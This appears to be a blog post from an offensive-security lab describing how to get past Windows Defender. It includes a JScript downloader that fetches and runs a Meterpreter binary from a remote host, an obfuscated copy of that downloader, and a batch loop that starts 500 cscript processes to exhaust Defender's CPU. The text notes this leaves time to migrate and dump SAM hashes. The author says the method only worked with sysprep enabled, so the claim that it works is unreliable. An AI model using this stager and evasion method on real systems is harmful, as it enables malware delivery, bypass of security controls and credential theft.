<h2 id="important-note">Important Note</h2>
<p>This technique was found to work only on Ludus Lab with <code class="language-plaintext highlighter-rouge">sysprep</code> enabled, which could potentially damage some Windows components and change their behavior, including security features. In Ludus, the relevant line in the config is:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>windows:            # This key must be set for windows VMs - all subkeys are optional  
  sysprep: false    # Set to true to run sysprep before any other tasks on this VM. Default: false
</pre></td></tr></tbody></table></code></pre></div></div>

<p>I discovered this after writing this fancy blog, but I still wanted to keep it as is. The lesson learned from this experience is to avoid using this feature for future research.</p>

<hr />

<h2 id="js-launcher">JS Launcher</h2>

<p>This is a quick, dirty, and very loud method of bypassing Windows Defender. Note that the Meterpreter payload will touch the disk in this scenario. I wanted to demonstrate an absurdly easy way of walking through Defender’s doors.</p>

<p>To download a Meterpreter payload to the disk, we will use <code class="language-plaintext highlighter-rouge">cscript.exe</code> by creating a <code class="language-plaintext highlighter-rouge">downloader.js</code> file and double-clicking it.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://10.8.8.8/met.exe</span><span class="dl">"</span>
<span class="kd">var</span> <span class="nb">Object</span> <span class="o">=</span> <span class="nx">WScript</span><span class="p">.</span><span class="nc">CreateObject</span><span class="p">(</span><span class="dl">'</span><span class="s1">MSXML2.XMLHTTP</span><span class="dl">'</span><span class="p">);</span>
<span class="nb">Object</span><span class="p">.</span><span class="nc">Open</span><span class="p">(</span><span class="dl">'</span><span class="s1">GET</span><span class="dl">'</span><span class="p">,</span> <span class="nx">url</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
<span class="nb">Object</span><span class="p">.</span><span class="nc">Send</span><span class="p">();</span>
<span class="k">if </span><span class="p">(</span><span class="nb">Object</span><span class="p">.</span><span class="nx">Status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">Stream</span> <span class="o">=</span> <span class="nx">WScript</span><span class="p">.</span><span class="nc">CreateObject</span><span class="p">(</span><span class="dl">'</span><span class="s1">ADODB.Stream</span><span class="dl">'</span><span class="p">);</span>
    <span class="nx">Stream</span><span class="p">.</span><span class="nc">Open</span><span class="p">();</span>
    <span class="nx">Stream</span><span class="p">.</span><span class="nx">Type</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="nx">Stream</span><span class="p">.</span><span class="nc">Write</span><span class="p">(</span><span class="nb">Object</span><span class="p">.</span><span class="nx">ResponseBody</span><span class="p">);</span>
    <span class="nx">Stream</span><span class="p">.</span><span class="nx">Position</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="nx">Stream</span><span class="p">.</span><span class="nc">SaveToFile</span><span class="p">(</span><span class="dl">"</span><span class="s2">met.exe</span><span class="dl">"</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
    <span class="nx">Stream</span><span class="p">.</span><span class="nc">Close</span><span class="p">();</span>
<span class="p">}</span>
<span class="kd">var</span> <span class="nx">r</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ActiveXObject</span><span class="p">(</span><span class="dl">"</span><span class="s2">WScript.Shell</span><span class="dl">"</span><span class="p">).</span><span class="nc">Run</span><span class="p">(</span><span class="dl">"</span><span class="s2">met.exe</span><span class="dl">"</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Both the JS script and the downloaded Meterpreter payload are detected statically before execution.</p>

<p>The first problem can be solved by using a public JS obfuscator, such as https://obfuscator.io/.</p>

<p>The resulting script will look like this:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="kd">var</span> <span class="nx">_0x17d249</span><span class="o">=</span><span class="nx">_0x1fcc</span><span class="p">;(</span><span class="kd">function</span><span class="p">(</span><span class="nx">_0x8d99f4</span><span class="p">,</span><span class="nx">_0x5b012c</span><span class="p">){</span><span class="kd">var</span> <span class="nx">_0x2cbcff</span><span class="o">=</span><span class="nx">_0x1fcc</span><span class="p">,</span><span class="nx">_0x176630</span><span class="o">=</span><span class="nf">_0x8d99f4</span><span class="p">();</span><span class="k">while</span><span class="p">(</span><span class="o">!!</span><span class="p">[]){</span><span class="k">try</span><span class="p">{</span><span class="kd">var</span> <span class="nx">_0x516bb3</span><span class="o">=-</span><span class="nf">parseInt</span><span class="p">(</span><span class="nf">_0x2cbcff</span><span class="p">(</span><span class="mh">0x1f5</span><span class="p">))</span><span class="o">/</span><span class="mh">0x1</span><span class="o">+-</span><span class="nf">parseInt</span><span class="p">(</span><span class="nf">_0x2cbcff</span><span class="p">(</span><span class="mh">0x1ec</span><span class="p">))</span><span class="o">/</span><span class="mh">0x2</span><span class="o">+-</span><span class="nf">parseInt</span><span class="p">(</span><span class="nf">_0x2cbcff</span><span class="p">(</span><span class="mh">0x1e5</span><span class="p">))</span><span class="o">/</span><span class="mh">0x3</span><span class="o">*</span><span class="p">(</span><span class="nf">parseInt</span><span class="p">(</span><span class="nf">_0x2cbcff</span><span class="p">(</span><span class="mh">0x1f2</span><span class="p">))</span><span class="o">/</span><span class="mh">0x4</span><span class="p">)</span><span class="o">+</span><span class="nf">parseInt</span><span class="p">(</span><span class="nf">_0x2cbcff</span><span class="p">(</span><span class="mh">0x1e7</span><span class="p">))</span><span class="o">/</span><span class="mh">0x5</span><span class="o">+-</span><span class="nf">parseInt</span><span class="p">(</span><span class="nf">_0x2cbcff</span><span class="p">(</span><span class="mh">0x1e6</span><span class="p">))</span><span class="o">/</span><span class="mh">0x6</span><span class="o">*</span><span class="p">(</span><span class="o">-</span><span class="nf">parseInt</span><span class="p">(</span><span class="nf">_0x2cbcff</span><span class="p">(</span><span class="mh">0x1f3</span><span class="p">))</span><span class="o">/</span><span class="mh">0x7</span><span class="p">)</span><span class="o">+</span><span class="nf">parseInt</span><span class="p">(</span><span class="nf">_0x2cbcff</span><span class="p">(</span><span class="mh">0x1ef</span><span class="p">))</span><span class="o">/</span><span class="mh">0x8</span><span class="o">+-</span><span class="nf">parseInt</span><span class="p">(</span><span class="nf">_0x2cbcff</span><span class="p">(</span><span class="mh">0x1ea</span><span class="p">))</span><span class="o">/</span><span class="mh">0x9</span><span class="o">*</span><span class="p">(</span><span class="o">-</span><span class="nf">parseInt</span><span class="p">(</span><span class="nf">_0x2cbcff</span><span class="p">(</span><span class="mh">0x1f1</span><span class="p">))</span><span class="o">/</span><span class="mh">0xa</span><span class="p">);</span><span class="k">if</span><span class="p">(</span><span class="nx">_0x516bb3</span><span class="o">===</span><span class="nx">_0x5b012c</span><span class="p">)</span><span class="k">break</span><span class="p">;</span><span class="k">else</span> <span class="nx">_0x176630</span><span class="p">[</span><span class="dl">'</span><span class="s1">push</span><span class="dl">'</span><span class="p">](</span><span class="nx">_0x176630</span><span class="p">[</span><span class="dl">'</span><span class="s1">shift</span><span class="dl">'</span><span class="p">]());}</span><span class="k">catch</span><span class="p">(</span><span class="nx">_0x444b68</span><span class="p">){</span><span class="nx">_0x176630</span><span class="p">[</span><span class="dl">'</span><span class="s1">push</span><span class="dl">'</span><span class="p">](</span><span class="nx">_0x176630</span><span class="p">[</span><span class="dl">'</span><span class="s1">shift</span><span class="dl">'</span><span class="p">]());}}}(</span><span class="nx">_0x4958</span><span class="p">,</span><span class="mh">0x52d5f</span><span class="p">));</span><span class="kd">var</span> <span class="nx">url</span><span class="o">=</span><span class="nf">_0x17d249</span><span class="p">(</span><span class="mh">0x1f8</span><span class="p">),</span><span class="nb">Object</span><span class="o">=</span><span class="nx">WScript</span><span class="p">[</span><span class="nf">_0x17d249</span><span class="p">(</span><span class="mh">0x1e4</span><span class="p">)](</span><span class="dl">'</span><span class="s1">MSXML2.XMLHTTP</span><span class="dl">'</span><span class="p">);</span><span class="nb">Object</span><span class="p">[</span><span class="dl">'</span><span class="s1">Open</span><span class="dl">'</span><span class="p">](</span><span class="nf">_0x17d249</span><span class="p">(</span><span class="mh">0x1f6</span><span class="p">),</span><span class="nx">url</span><span class="p">,</span><span class="o">!</span><span class="p">[]),</span><span class="nb">Object</span><span class="p">[</span><span class="dl">'</span><span class="s1">Send</span><span class="dl">'</span><span class="p">]();</span><span class="k">if</span><span class="p">(</span><span class="nb">Object</span><span class="p">[</span><span class="nf">_0x17d249</span><span class="p">(</span><span class="mh">0x1e8</span><span class="p">)]</span><span class="o">==</span><span class="mh">0xc8</span><span class="p">){</span><span class="kd">var</span> <span class="nx">Stream</span><span class="o">=</span><span class="nx">WScript</span><span class="p">[</span><span class="dl">'</span><span class="s1">CreateObject</span><span class="dl">'</span><span class="p">](</span><span class="nf">_0x17d249</span><span class="p">(</span><span class="mh">0x1ee</span><span class="p">));</span><span class="nx">Stream</span><span class="p">[</span><span class="nf">_0x17d249</span><span class="p">(</span><span class="mh">0x1f0</span><span class="p">)](),</span><span class="nx">Stream</span><span class="p">[</span><span class="nf">_0x17d249</span><span class="p">(</span><span class="mh">0x1e9</span><span class="p">)]</span><span class="o">=</span><span class="mh">0x1</span><span class="p">,</span><span class="nx">Stream</span><span class="p">[</span><span class="nf">_0x17d249</span><span class="p">(</span><span class="mh">0x1f4</span><span class="p">)](</span><span class="nb">Object</span><span class="p">[</span><span class="nf">_0x17d249</span><span class="p">(</span><span class="mh">0x1f9</span><span class="p">)]),</span><span class="nx">Stream</span><span class="p">[</span><span class="nf">_0x17d249</span><span class="p">(</span><span class="mh">0x1eb</span><span class="p">)]</span><span class="o">=</span><span class="mh">0x0</span><span class="p">,</span><span class="nx">Stream</span><span class="p">[</span><span class="nf">_0x17d249</span><span class="p">(</span><span class="mh">0x1f7</span><span class="p">)](</span><span class="dl">'</span><span class="s1">met.exe</span><span class="dl">'</span><span class="p">,</span><span class="mh">0x2</span><span class="p">),</span><span class="nx">Stream</span><span class="p">[</span><span class="dl">'</span><span class="s1">Close</span><span class="dl">'</span><span class="p">]();}</span><span class="kd">var</span> <span class="nx">r</span><span class="o">=</span><span class="k">new</span> <span class="nc">ActiveXObject</span><span class="p">(</span><span class="nf">_0x17d249</span><span class="p">(</span><span class="mh">0x1fa</span><span class="p">))[</span><span class="nf">_0x17d249</span><span class="p">(</span><span class="mh">0x1ed</span><span class="p">)](</span><span class="dl">'</span><span class="s1">met.exe</span><span class="dl">'</span><span class="p">);</span><span class="kd">function</span> <span class="nf">_0x1fcc</span><span class="p">(</span><span class="nx">_0x5aab95</span><span class="p">,</span><span class="nx">_0x3af232</span><span class="p">){</span><span class="kd">var</span> <span class="nx">_0x495812</span><span class="o">=</span><span class="nf">_0x4958</span><span class="p">();</span><span class="k">return</span> <span class="nx">_0x1fcc</span><span class="o">=</span><span class="kd">function</span><span class="p">(</span><span class="nx">_0x1fcc18</span><span class="p">,</span><span class="nx">_0xbf485</span><span class="p">){</span><span class="nx">_0x1fcc18</span><span class="o">=</span><span class="nx">_0x1fcc18</span><span class="o">-</span><span class="mh">0x1e4</span><span class="p">;</span><span class="kd">var</span> <span class="nx">_0xf5897c</span><span class="o">=</span><span class="nx">_0x495812</span><span class="p">[</span><span class="nx">_0x1fcc18</span><span class="p">];</span><span class="k">return</span> <span class="nx">_0xf5897c</span><span class="p">;},</span><span class="nf">_0x1fcc</span><span class="p">(</span><span class="nx">_0x5aab95</span><span class="p">,</span><span class="nx">_0x3af232</span><span class="p">);}</span><span class="kd">function</span> <span class="nf">_0x4958</span><span class="p">(){</span><span class="kd">var</span> <span class="nx">_0x88af5</span><span class="o">=</span><span class="p">[</span><span class="dl">'</span><span class="s1">174024sBDVKk</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">6aCgHFV</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">2711895TrvrLm</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">Status</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">Type</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">9307413HbmAyM</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">Position</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">792432hvPFro</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">Run</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">ADODB.Stream</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">470216MBGiiE</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">Open</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">10fGQDlo</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">36dgRipP</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">779387TmqUOV</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">Write</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">489071HUhQcm</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">GET</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">SaveToFile</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">http://10.8.8.8/met.exe</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">ResponseBody</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">WScript.Shell</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">CreateObject</span><span class="dl">'</span><span class="p">];</span><span class="nx">_0x4958</span><span class="o">=</span><span class="kd">function</span><span class="p">(){</span><span class="k">return</span> <span class="nx">_0x88af5</span><span class="p">;};</span><span class="k">return</span> <span class="nf">_0x4958</span><span class="p">();}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Save it on the desktop as <code class="language-plaintext highlighter-rouge">obf.js</code> and attempt to execute it.</p>

<p>Once again, the downloaded Meterpreter payload is detected, but this time, the JS script (obf.js) is not removed by Windows Security.</p>

<h2 id="overloading-the-cpu">Overloading the CPU</h2>

<p><img src="https://i.imgur.com/5TR2Szu.png" alt="Catfender" /></p>

<p>To successfully execute Meterpreter with this technique, we need to spam multiple <code class="language-plaintext highlighter-rouge">cscript.exe</code> processes running our <code class="language-plaintext highlighter-rouge">obf.js</code> script, which will exhaust the CPU due to Defender’s <code class="language-plaintext highlighter-rouge">MsMpEng.exe</code> process.</p>

<p>This time, we will create a separate <code class="language-plaintext highlighter-rouge">launcher.bat</code> script that spawns multiple instances of our malicious JS payload execution via a for loop.</p>

<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>@echo <span class="na">off</span>
<span class="k">for</span> <span class="na">/l </span><span class="vm">%%i</span> <span class="k">in</span> <span class="o">(</span><span class="m">1</span><span class="o">,</span><span class="m">1</span><span class="o">,</span><span class="m">500</span><span class="o">)</span> <span class="k">do</span> <span class="o">(</span>
    <span class="nb">cscript</span> //nologo <span class="kd">obf</span>.js
<span class="o">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>We can execute this batch script multiple times and wait a few seconds.</p>

<div style="text-align: center;">
  <video width="100%" height="auto" controls="" playsinline="" webkit-playsinline="" x-webkit-airplay="allow" style="max-width: 640px;">
    <source src="https://i.imgur.com/Cr8xbD4.mp4" type="video/mp4" />
    Your browser does not support the video tag.
  </video>
</div>

<p>After some time, the Meterpreter session might terminate, but as demonstrated in the video, there is still sufficient time to perform migration, dump hashes from the SAM database, and carry out additional operations.</p>

<hr />

